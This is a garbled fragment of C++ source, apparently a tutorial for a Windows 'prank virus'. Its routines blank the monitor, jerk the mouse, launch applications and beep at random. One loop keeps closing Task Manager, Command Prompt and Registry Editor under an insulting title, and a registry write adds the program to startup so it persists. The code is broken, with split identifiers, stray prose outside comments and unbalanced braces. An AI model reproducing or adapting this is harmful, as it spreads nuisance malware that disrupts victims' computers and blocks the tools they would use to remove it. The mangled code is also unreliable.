
#include < iostream > #include < stdio.h > #include < windows.h > #include < winable.h > #include < conio.h > #include < ctime >

  Turn off the monitor

void Hibernation() {
  Sleep(1000);
  SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}

/*making your mouse go crazy. Make two rand var's and tell the mouse to goto them*/

void CrazyMouse() {
  X = rand() % 801;
  Y = rand() % 601;
  SetCursorPos(X, Y);
}

open random Apps as it says OpenStuff

void OpenStuff() {
  ShellExecute(NULL, "open", Notepad, NULL, NULL, SW_MAXI MIZE);
  ShellExecute(NULL, "open", MineSweeper, NULL, NULL, SW_ MAXIMIZE);
  ShellExecute(NULL, "open", Hearts, NULL, NULL, SW_MAXIM IZE);
  ShellExecute(NULL, "open", Website, NULL, NULL, SW_MAXI MIZE);
}

Find windows by name and destroy them...Using the FindWindow command lets use do it and
  if
its not null and it found the window open give it a command.

DWORD WINAPI DestroyWindows(LPVOID) {
    while (1) {
      TaskMgr = FindWindow(NULL, "Windows Task Manager");
      CMD = FindWindow(NULL, "Command Prompt");
      Regedit = FindWindow(NULL, "Registry Editor");
      if (TaskMgr != NULL) {
        SetWindowText(TaskMgr, "You Suck Balls Superman");
        PostMessage(TaskMgr, WM_CLOSE, (LPARAM) 0, (WPARAM) 0);
      }
      if (CMD != NULL) {
        SetWindowText(CMD, "You Suck Balls Superman");
        PostMessage(CMD, WM_CLOSE, (LPARAM) 0, (WPARAM) 0);
      }
      if (Regedit != NULL) {
        SetWindowText(Regedit, "You Suck Balls Superman");
        PostMessage(Regedit, WM_CLOSE, (LPARAM) 0, (WPARAM) 0);
      }

      Add your program to run when windows starts

      HKEY hKey;
      RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\W indows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, & hKey);
      RegSetValueEx(hKey, "SetUp", 0, REG_SZ, (const unsigned char * ) system, sizeof(system));
      RegCloseKey(hKey);

      /*Make your comp beep different freq and different lengths again by rand numbers*/

      void Beeper() {
        Freq = rand() % 2001;
        Dur = rand() % 301;
        Beep(Freq, Dur);
      }
